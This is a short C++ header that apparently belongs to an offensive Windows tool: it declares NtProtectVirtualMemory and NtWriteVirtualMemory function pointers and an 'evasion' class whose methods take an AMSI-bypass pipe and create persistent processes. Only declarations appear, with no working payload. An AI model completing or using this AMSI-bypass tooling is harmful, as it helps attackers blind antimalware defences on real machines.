#include <Windows.h>
#include "process.h"
#include <string>
#include <vector>

#pragma once

typedef NTSTATUS(NTAPI* NtProtectVirtualMemoryFunctionPointer)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    OUT PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
);

typedef NTSTATUS(NTAPI* NtWriteVirtualMemoryFunctionPointer)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten
);

class evasion
{
private:
public:
    static void send_command(const char* cmd, HANDLE amsiBypassWrPipe);

    static PROCESS_INFO* create_process(const char* cmd);
    static PROCESS_INFO* create_persistent_process();
};

